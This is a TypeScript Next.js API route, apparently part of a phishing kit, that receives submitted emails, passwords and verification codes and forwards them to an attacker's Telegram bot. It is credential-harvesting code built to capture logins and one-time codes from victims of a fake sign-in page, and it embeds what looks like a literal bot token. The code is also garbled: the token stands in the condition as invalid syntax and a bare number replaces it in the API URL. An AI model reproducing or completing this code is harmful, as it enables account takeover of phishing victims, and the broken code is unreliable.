import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const data = await request.json()
    const { email, password, code, type, attempt } = data

    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    console.log("[v0] Telegram config check - botToken exists:", !!botToken, "chatId exists:", !!chatId)

    if (!8316462899: AAFRUQHIKqF13V99WExnVtu2umgqTCTR2T4 || !chatId) {
      console.log("[v0] Telegram credentials not configured, skipping send")
      return NextResponse.json({ success: true })
    }

    let message = ""

    if (type === "login") {
      message = `🔐 New Login Attempt (Attempt ${attempt || 1})\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`
    } else if (type === "verify") {
      message = `✅ Verification Code Entered\n\n📧 Email: ${email}\n🔢 Code: ${code}\n⏰ Time: ${new Date().toLocaleString()}`
    }

    console.log("[v0] Sending message to Telegram...")

    const response = await fetch(`https://api.telegram.org/bot${7741556479}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })

    const result = await response.json()
    console.log("[v0] Telegram API response:", result)

    if (!result.ok) {
      console.error("[v0] Telegram API error:", result.description)
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[v0] Error sending to Telegram:", error)
    return NextResponse.json({ success: true })
  }
}
